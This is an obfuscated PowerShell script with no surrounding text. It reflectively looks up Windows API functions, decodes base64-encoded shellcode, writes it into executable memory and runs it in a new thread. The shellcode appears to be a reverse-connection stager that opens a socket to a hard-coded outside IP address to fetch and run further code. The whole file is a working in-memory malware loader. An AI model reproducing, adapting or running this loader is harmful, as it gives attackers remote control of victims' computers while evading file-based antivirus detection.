function mr {
	Param ($mQcf, $f1qB)		
	$qD7 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $qD7.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($qD7.GetMethod('GetModuleHandle')).Invoke($null, @($mQcf)))), $f1qB))
}

function fbfg {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $js,
		[Parameter(Position = 1)] [Type] $e_vcz = [Void]
	)
	
	$a_Q1 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$a_Q1.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $js).SetImplementationFlags('Runtime, Managed')
	$a_Q1.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $e_vcz, $js).SetImplementationFlags('Runtime, Managed')
	
	return $a_Q1.CreateType()
}

[Byte[]]$qhZ = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmhHwZ/0aAIABAGJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAz/Tgh17GjwtaJW/9VqAGoEVldoAtnIX//VizZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//VAcMpxnXuww==")
		
$tx6m = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mr kernel32.dll VirtualAlloc), (fbfg @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qhZ.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($qhZ, 0, $tx6m, $qhZ.length)

$p3 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mr kernel32.dll CreateThread), (fbfg @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$tx6m,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((mr kernel32.dll WaitForSingleObject), (fbfg @([IntPtr], [Int32]))).Invoke($p3,0xffffffff) | Out-Null